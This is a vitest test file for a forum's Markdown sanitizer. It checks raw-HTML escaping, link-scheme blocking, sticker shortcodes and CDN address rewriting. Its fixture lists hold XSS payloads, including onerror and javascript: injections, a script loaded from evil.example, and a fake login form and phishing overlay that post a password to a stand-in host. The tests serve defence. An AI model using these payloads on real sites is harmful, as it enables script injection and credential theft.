import { beforeAll, describe, expect, it } from 'vitest'
import { postExcerpt } from '~/utils/excerpt'
import { imagesToStickers, isUnsafeDestination, QUOTE_LENGTH, quoteDraft, renderableMarkdown, replyQuote, stickerIndex, stickersToImages, stickerToken, tokenIndex, WORD_JOINER } from '../shared/post-markdown'
import { loadMarked } from './support/tuffex-stubs'

// Run the text through the parser TxMarkdownView uses (see loadMarked).
let marked: Awaited<ReturnType<typeof loadMarked>>

beforeAll(async () => {
  marked = await loadMarked()
})

function html(source: string): string {
  return marked.parse(renderableMarkdown(source))
}

/**
 * The rendered HTML with every quoted attribute value blanked (marked always
 * double-quotes them), so text inside a value such as a title or an alt,
 * `title="t&quot; onmouseover=…"`, never reads as an attribute of its own.
 */
function outsideValues(out: string): string {
  return out.replace(/="[^"]*"/g, '=""')
}

/** Tags a post can never produce once rendered, whatever it contains. */
const FORBIDDEN_TAG = /<(?:script|style|iframe|object|embed|form|input|button|textarea|svg|math|link|meta|base|div|span|details|table)\b/i

const ATTACKS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<style>body{display:none}</style>',
  '<div style="position:fixed;inset:0">点这里重新登录</div>',
  '<iframe src="https://evil.example"></iframe>',
  '<!-- hidden --><b>bold</b>',
  '<svg onload=alert(1)>',
  '<form action="https://evil.example"><input name=p><button>登录</button></form>',
  'text <span onclick="alert(1)">inline</span> text',
  '- item\n\n  <details open><summary>x</summary></details>',
  '> quote\n<style>*{color:red}</style>',
  '```\ncode\n```~\n<style>x</style>',
  'a `\n<script>alert(1)</script>` b',
  '<SCRIPT SRC=//evil.example/x.js></SCRIPT>',
  '</p><script>alert(1)</script>',
  '<?php echo 1 ?>',
  '<![CDATA[<script>alert(1)</script>]]>',
  '<a href="javascript:alert(1)">点我</a>',
  '<img src="javascript:alert(1)">',
  '<IMG SRC=vbscript:msgbox(1)>',
  '<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" onerror=alert(1)>',
  '<img src="https://s2.loli.net/a.png" onerror="alert(1)" onload=alert(2)>',
  '<body onload=alert(1)>',
  '<video><source onerror="alert(1)"></video>',
  '[x](https://example.invalid "t\\" onmouseover=\\"alert(1)")',
]

describe('raw HTML in a post is shown as text', () => {
  it.each(ATTACKS)('%j renders no tag and no event handler', (source) => {
    const out = html(source)
    expect(out).not.toMatch(FORBIDDEN_TAG)
    // Handler text may survive as visible text (&lt;span onclick=…); never inside a real tag.
    expect(outsideValues(out)).not.toMatch(/<[a-z][^>]*\son\w+=/i)
    expect(outsideValues(out)).not.toMatch(/<[a-z][^>]*\sstyle=/i)
  })

  it('keeps the text readable: only an invisible word joiner follows the <', () => {
    expect(renderableMarkdown('<b>x</b>')).toBe(`<${WORD_JOINER}b>x<${WORD_JOINER}/b>`)
    expect(html('<b>x</b>')).toContain(`&lt;${WORD_JOINER}b&gt;x`)
  })

  it('shows code as written, in fences and inline', () => {
    const fenced = html('```c\n#include <stdio.h>\nint main() { return a < b; }\n```')
    expect(fenced).toContain(`#include &lt;${WORD_JOINER}stdio.h&gt;`)
    expect(fenced).toContain('return a &lt; b;')
    expect(html('用 `List<String>` 就行')).toContain(`<code>List&lt;${WORD_JOINER}String&gt;</code>`)
  })

  it('leaves a comparison, an arrow and an autolink alone', () => {
    expect(renderableMarkdown('a < b, 1<2, <- back')).toBe('a < b, 1<2, <- back')
    expect(html('<https://github.com/Yangtze-University-Geek-Class>')).toContain('<a href="https://github.com/Yangtze-University-Geek-Class">')
    expect(html('<mailto:hi@example.invalid>')).toContain('href="mailto:hi@example.invalid"')
  })

  it('turns a Typora-style <img> into a Markdown image and drops its style', () => {
    const source = '<img src="../published/f233bcfcb446e028.webp" alt="image-20230925211333855" style="zoom: 33%;" />'
    expect(renderableMarkdown(source)).toBe('![image-20230925211333855](../published/f233bcfcb446e028.webp)')
    expect(html(source)).toContain('<img src="../published/f233bcfcb446e028.webp" alt="image-20230925211333855">')
    // An alt that tries to close the image and open a link stays alt text.
    const sneaky = html('<img src="https://s2.loli.net/a.png" alt="a](javascript:alert(1))">')
    expect(sneaky).toMatch(/^<p><img src="https:\/\/s2\.loli\.net\/a\.png" alt="[^"]*"><\/p>\n$/)
    expect(sneaky).not.toMatch(/(?:href|src)="[^"]*javascript/i)
  })

  it('does not convert <img> inside code', () => {
    expect(renderableMarkdown('```html\n<img src="a.png">\n```')).toBe(`\`\`\`html\n<${WORD_JOINER}img src="a.png">\n\`\`\``)
    expect(renderableMarkdown('写成 `<img src="a.png">` 就行')).toBe(`写成 \`<${WORD_JOINER}img src="a.png">\` 就行`)
  })
})

describe('links and images only go to http(s), mailto or the site itself', () => {
  const BLOCKED = [
    '[点我](javascript:alert(1))',
    '[点我]( JaVaScRiPt:alert(1))',
    '[点我](java&#115;cript:alert(1))',
    '[点我](java&#x73;cript&colon;alert(1))',
    '[点我](jav&#x09;ascript:alert(1))',
    '[点我](<javascript:alert(1)>)',
    '[点我](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
    '[点我](vbscript:msgbox(1))',
    '![图](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)',
    '[点我][x]\n\n[x]: javascript:alert(1)',
    '[点我][x]\n\n[x]:\n  javascript:alert(1)',
    '> [点我][x]\n>\n> [x]: data:text/html,x',
    '![图](javascript:alert(1))',
    '![图](vbscript:msgbox(1))',
    '![图]( data:text/html,x)',
    '<img src="javascript:alert(1)" alt="x">',
    '<img src=" data:image/png;base64,AAAA">',
  ]

  it.each(BLOCKED)('%j renders no dangerous href or src', (source) => {
    const out = html(source)
    expect(out).not.toMatch(/(?:href|src)="\s*(?:javascript|data|vbscript):/i)
    expect(out).not.toMatch(/(?:href|src)="[^"#]*(?:javascript|vbscript)/i)
  })

  it('turns a blocked address into an in-page anchor', () => {
    expect(renderableMarkdown('[a](javascript:alert(1))')).toBe('[a](#javascript:alert(1))')
    expect(html('[a](javascript:alert(1))')).toContain('href="#javascript:alert(1)"')
  })

  it('keeps ordinary links working', () => {
    expect(html('[文档](https://example.invalid/docs)')).toContain('href="https://example.invalid/docs"')
    expect(html('[写信](mailto:hi@example.invalid)')).toContain('href="mailto:hi@example.invalid"')
    expect(html('[下一篇](./t72)')).toContain('href="./t72"')
    expect(html('[楼上](#post-p10001)')).toContain('href="#post-p10001"')
    expect(html('![截图](../published/abc.webp)')).toContain('src="../published/abc.webp"')
  })

  it('keeps a title that pretends to open an attribute inside the title', () => {
    expect(html('[x](https://example.invalid "t\\" onmouseover=\\"alert(1)")')).toContain('title="t&quot; onmouseover=&quot;alert(1)"')
  })

  it('never lets a guest post produce an event handler or a script address, whatever the input', () => {
    for (const source of [...ATTACKS, ...BLOCKED]) {
      const out = html(source)
      expect(outsideValues(out), source).not.toMatch(/<[a-z][^>]*\son\w+\s*=/i)
      expect(out, source).not.toMatch(/<(?:script|iframe|object|embed|svg|form)\b/i)
      expect(out, source).not.toMatch(/(?:href|src)\s*=\s*"\s*(?:javascript|data|vbscript):/i)
    }
  })

  it('classifies destinations the way a browser reads them', () => {
    expect(isUnsafeDestination('javascript:x')).toBe(true)
    expect(isUnsafeDestination('\\javascript:x')).toBe(true)
    expect(isUnsafeDestination('&#106avascript:x')).toBe(true)
    expect(isUnsafeDestination('https://x')).toBe(false)
    expect(isUnsafeDestination('/forum/t/t73')).toBe(false)
    expect(isUnsafeDestination('t73')).toBe(false)
    expect(isUnsafeDestination('')).toBe(false)
  })
})

/**
 * Someone else's text reaches the editor as a quote (ReplyComposer) or a moderator's edit (PostCard). The
 * editor is a plain textarea and its preview is ForumMarkdown (tests/post-editor.test.ts), so the draft goes
 * in as written and is only ever rendered through `renderableMarkdown`, like the post it came from (#126, #134).
 */
/** HTML written with character entities: text in a post, and nothing in the editor decodes them any more. */
const ENTITY_ATTACKS = [
  '&lt;style&gt;body{display:none}&lt;/style&gt;',
  '&#60;form action="https://evil.example"&#62;&#60;input type=password&#62;&#60;/form&#62;',
  '&#x3c;style&#x3e;*{color:red}&#x3C;/style&#x3E;',
  '&LT;img src=x onerror=alert(1)&GT;',
  '> 引用 &lt;style&gt;body{display:none}&lt;/style&gt;',
]

describe('someone else\'s text in a draft', () => {
  it('quotes a one-line excerpt as written', () => {
    expect(replyQuote('<b>x</b> & y')).toBe('> <b>x</b> & y\n\n')
    const content = '第一段 <style>body{display:none}</style>\n\n**第二段** &lt;b&gt;'
    expect(quoteDraft({ content })).toBe(`> ${postExcerpt(content, QUOTE_LENGTH)}\n\n`)
  })

  it('would put the tag on the page if the draft were rendered raw (the case this guards)', () => {
    expect(marked.parse(quoteDraft({ content: '<style>body{display:none}</style>' }))).toMatch(/<style>/)
  })

  it.each([...ATTACKS, ...ENTITY_ATTACKS])('%j renders no tag, handler or style, quoted or edited', (source) => {
    for (const draft of [quoteDraft({ content: source }), source]) {
      const out = html(draft)
      expect(out).not.toMatch(FORBIDDEN_TAG)
      expect(outsideValues(out)).not.toMatch(/<[a-z][^>]*\s(?:on\w+|style)=/i)
    }
  })
})

describe('quoting a reply (#276)', () => {
  it('names the author before the first 80 characters', () => {
    const content = '字'.repeat(120)
    expect(quoteDraft({ content }, 'ada')).toBe(`> @ada：${postExcerpt(content, QUOTE_LENGTH)}\n\n`)
    expect(replyQuote('一行', 'ada')).toBe('> @ada：一行\n\n')
  })
})

describe('stickers (#276)', () => {
  const WAVE = { shortcode: 'yugc-wave', label: '挥手', url: `/api/forum/stickers/${'a'.repeat(64)}.webp` }
  const stickers = stickerIndex([{ stickers: [WAVE] }, { stickers: [{ shortcode: 'odd', label: '外站', url: 'https://evil.example/x.webp' }] }])
  const rendered = (source: string) => marked.parse(renderableMarkdown(source, stickers))

  it('shows a whitelisted shortcode as its picture and leaves every other one as text', () => {
    const out = rendered('你好 :yugc-wave: 和 :yugc-unknown:')
    expect(out).toContain(`<img class="forum-sticker" alt="挥手" src="${WAVE.url}">`)
    expect(out).toContain(':yugc-unknown:')
  })

  it('never turns a sticker whose address is off the forum into a picture', () => {
    expect(rendered(':odd:')).not.toContain('<img')
  })

  it('leaves shortcodes in inline code and code blocks alone', () => {
    const out = rendered('`:yugc-wave:`\n\n```\n:yugc-wave:\n```')
    expect(out).not.toContain('<img')
    expect(out.match(/:yugc-wave:/g)).toHaveLength(2)
  })

  it('escapes the label, and raw HTML around a sticker still shows as text', () => {
    const odd = stickerIndex([{ stickers: [{ ...WAVE, label: '"><script>x</script>' }] }])
    const out = marked.parse(renderableMarkdown('<b>粗</b> :yugc-wave:', odd))
    expect(out).not.toMatch(/<script|<b>/)
    expect(out).toContain('alt="&quot;&gt;&lt;script&gt;x&lt;/script&gt;"')
  })

  it('renders shortcodes as text when there is no sticker list (the demo)', () => {
    expect(marked.parse(renderableMarkdown(':yugc-wave:'))).not.toContain('<img')
  })

  it('goes into the editor as pictures and comes back as the same shortcodes, code untouched', () => {
    const source = '早 :yugc-wave: `:yugc-wave:` :yugc-unknown:'
    const inEditor = stickersToImages(source, stickers)
    expect(inEditor).toBe(`早 ![挥手](${WAVE.url}) \`:yugc-wave:\` :yugc-unknown:`)
    expect(imagesToStickers(inEditor, stickers)).toBe(source)
    // The editor may write the image back with a title; any other picture stays a picture.
    expect(imagesToStickers(`![挥手](${WAVE.url} "挥手") ![图](/api/forum/uploads/b.png)`, stickers)).toBe(':yugc-wave: ![图](/api/forum/uploads/b.png)')
  })

  it('changes nothing without a sticker list', () => {
    expect(stickersToImages(':yugc-wave:', new Map())).toBe(':yugc-wave:')
    expect(imagesToStickers(`![挥手](${WAVE.url})`, new Map())).toBe(`![挥手](${WAVE.url})`)
  })
})

describe('the Bilibili way of writing a sticker, [包名_名字] (#276)', () => {
  const WAVE = { shortcode: 'yugc-wave', label: '打招呼', url: `/api/forum/stickers/${'a'.repeat(64)}.webp` }
  const stickers = stickerIndex([{ name: '极客娘', stickers: [WAVE] }])
  const rendered = (source: string) => marked.parse(renderableMarkdown(source, stickers))

  it('gives every sticker its [包名_名字], and a pack without a name gives none', () => {
    expect(stickers.get('yugc-wave')?.token).toBe('[极客娘_打招呼]')
    expect(stickerToken('猫猫', '招手')).toBe('[猫猫_招手]')
    expect(stickerIndex([{ stickers: [WAVE] }]).get('yugc-wave')?.token).toBeUndefined()
  })

  it('renders [极客娘_打招呼] as the sticker, with the way to type it as the title', () => {
    const out = rendered('早 [极客娘_打招呼] 好')
    expect(out).toContain(`<img class="forum-sticker" alt="打招呼" title="[极客娘_打招呼]" src="${WAVE.url}">`)
    expect(rendered(':yugc-wave:')).toContain('title="[极客娘_打招呼]"')
  })

  it('leaves links, unknown names and code alone', () => {
    expect(rendered('[极客娘_打招呼](https://example.com)')).toContain('<a href="https://example.com">极客娘_打招呼</a>')
    expect(rendered('[极客娘_没有这张] [打招呼]')).not.toContain('<img')
    expect(rendered('`[极客娘_打招呼]`')).not.toContain('<img')
  })

  it('goes into the editor as the picture and is stored as the shortcode', () => {
    expect(stickersToImages('[极客娘_打招呼]', stickers)).toBe(`![打招呼](${WAVE.url})`)
    expect(imagesToStickers('早[极客娘_打招呼]好 [极客娘_打招呼](x)', stickers)).toBe('早:yugc-wave:好 [极客娘_打招呼](x)')
  })

  it('uses the first sticker when two share a name', () => {
    const twin = stickerIndex([{ name: '极客娘', stickers: [WAVE, { ...WAVE, shortcode: 'yugc-wave-2' }] }])
    expect(tokenIndex(twin).get('[极客娘_打招呼]')?.shortcode).toBe('yugc-wave')
  })
})

describe('stickers served from the controlled CDN (#286)', () => {
  const hash = 'c'.repeat(64)
  const CDN = `https://cdn.crosery.com/yzgc/static/site/forum/stickers/${hash}.webp`
  const SAME = `/api/forum/stickers/${hash}.webp`
  const WAVE = { shortcode: 'yugc-wave', label: '挥手', url: CDN }
  const stickers = stickerIndex([{ name: '极客娘', stickers: [WAVE] }])
  const rendered = (source: string, list = stickers) => marked.parse(renderableMarkdown(source, list))

  it('renders a shortcode with the address the sticker list gives, the CDN one included', () => {
    expect(rendered(':yugc-wave:')).toContain(`<img class="forum-sticker" alt="挥手" title="[极客娘_挥手]" src="${CDN}">`)
    expect(rendered('[极客娘_挥手]')).toContain(`src="${CDN}"`)
  })

  it('never turns a list entry on another domain, another CDN folder or with a path trick into a picture', () => {
    for (const url of [
      `https://evil.example/yzgc/static/site/forum/stickers/${hash}.webp`,
      `https://cdn.crosery.com/yzgc/static/site/forum/guides/${hash}.webp`,
      `https://cdn.crosery.com/yzgc/static/site/forum/stickers/../${hash}.webp`,
      `http://cdn.crosery.com/yzgc/static/site/forum/stickers/${hash}.webp`,
      'javascript:alert(1)',
    ])
      expect(rendered(':odd:', stickerIndex([{ stickers: [{ shortcode: 'odd', label: '外', url }] }]))).not.toContain('<img')
  })

  it('goes into the editor as the CDN picture and comes back as the same shortcode, code untouched', () => {
    const source = '早 :yugc-wave: `:yugc-wave:`'
    const inEditor = stickersToImages(source, stickers)
    expect(inEditor).toBe(`早 ![挥手](${CDN}) \`:yugc-wave:\``)
    expect(imagesToStickers(inEditor, stickers)).toBe(source)
    expect(imagesToStickers(`![挥手](${CDN} "挥手")`, stickers)).toBe(':yugc-wave:')
  })

  it('recognises one picture by its content hash whichever address form it carries (the switch may flip between page loads)', () => {
    expect(imagesToStickers(`![挥手](${SAME})`, stickers)).toBe(':yugc-wave:')
    const sameOriginList = stickerIndex([{ name: '极客娘', stickers: [{ ...WAVE, url: SAME }] }])
    expect(imagesToStickers(`![挥手](${CDN})`, sameOriginList)).toBe(':yugc-wave:')
    expect(imagesToStickers(`![挥手](${SAME}) ![挥手](${CDN})`, sameOriginList)).toBe(':yugc-wave: :yugc-wave:')
  })

  it('leaves a picture of another hash, another domain or another CDN folder a picture', () => {
    const other = `https://cdn.crosery.com/yzgc/static/site/forum/stickers/${'d'.repeat(64)}.webp`
    const guide = `https://cdn.crosery.com/yzgc/static/site/forum/guides/${hash}.webp`
    const evil = `https://evil.example/yzgc/static/site/forum/stickers/${hash}.webp`
    expect(imagesToStickers(`![a](${other}) ![b](${guide}) ![c](${evil})`, stickers)).toBe(`![a](${other}) ![b](${guide}) ![c](${evil})`)
  })
})


describe('addresses written under the old Garage prefix (#346)', () => {
  const hash = 'e'.repeat(64)
  const OLD_STICKER = `https://cdn.yangtzeu.work/geek-public/static/site/forum/stickers/${hash}.webp`
  const NEW_STICKER = `https://cdn.crosery.com/yzgc/static/site/forum/stickers/${hash}.webp`
  const OLD_PICTURE = 'https://cdn.yangtzeu.work/geek-public/static/site/forum/published/0123456789abcdef.webp'
  const NEW_PICTURE = 'https://cdn.crosery.com/yzgc/static/site/forum/published/0123456789abcdef.webp'
  const stickers = stickerIndex([{ name: '极客娘', stickers: [{ shortcode: 'yugc-wave', label: '挥手', url: NEW_STICKER }] }])

  it('shows a published picture stored with the old prefix under the new prefix, the stored text untouched', () => {
    const source = `旧帖 ![图](${OLD_PICTURE} "标题")`
    const html = marked.parse(renderableMarkdown(source))
    expect(html).toContain(`src="${NEW_PICTURE}"`)
    expect(html).not.toContain('geek-public')
    expect(source).toContain(OLD_PICTURE)
  })

  it('rewrites the same address in a raw <img>, in a reference definition, and as a sticker picture', () => {
    expect(marked.parse(renderableMarkdown(`<img src="${OLD_PICTURE}" alt="图">`))).toContain(`src="${NEW_PICTURE}"`)
    expect(renderableMarkdown(`![图][p]\n\n[p]: ${OLD_PICTURE}`)).toContain(`[p]: ${NEW_PICTURE}`)
    expect(marked.parse(renderableMarkdown(`![挥手](${OLD_STICKER})`, stickers))).toContain(`src="${NEW_STICKER}"`)
  })

  it('still refuses an unsafe scheme after the rewrite', () => {
    expect(renderableMarkdown(`![x](javascript:alert(1))`)).not.toContain('](javascript:')
  })

  it('goes into the editor as the new picture and comes back as the shortcode, whichever prefix it was stored with', () => {
    expect(stickersToImages(`早 ![挥手](${OLD_STICKER})`, stickers)).toBe(`早 ![挥手](${NEW_STICKER})`)
    expect(stickersToImages(`早 :yugc-wave:`, stickers)).toBe(`早 ![挥手](${NEW_STICKER})`)
    expect(imagesToStickers(`![挥手](${OLD_STICKER})`, stickers)).toBe(':yugc-wave:')
    expect(stickersToImages(`![图](${OLD_PICTURE})`, new Map())).toBe(`![图](${NEW_PICTURE})`)
  })
})
